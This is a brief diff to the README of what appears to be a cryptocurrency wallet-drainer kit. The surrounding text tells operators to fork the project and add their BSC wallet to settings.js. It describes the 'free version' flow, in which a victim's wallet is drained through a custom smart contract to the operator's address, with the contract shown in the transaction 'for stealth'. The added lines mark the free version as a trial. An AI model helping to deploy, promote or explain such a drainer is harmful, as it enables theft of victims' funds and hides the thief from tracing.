@@ -75,6 +75,9 @@ Fork ---------->  add your bsc wallet to settings.js file  ------> Go to  https:
 
 ### HOW IT WORKS FOR FREE VERSION ###
 
+### REMEMBER THE FREE VERSION IS ONLY MENT TO BE A TRIAL A DEMO ###
+
+
 Wallet gets drained ----> CUSTOM SMART CONTRACT -----> YOUR BSC ADDRESS
 
 The !!! smart contract address !!! appears in the transaction not yours this is for stealth
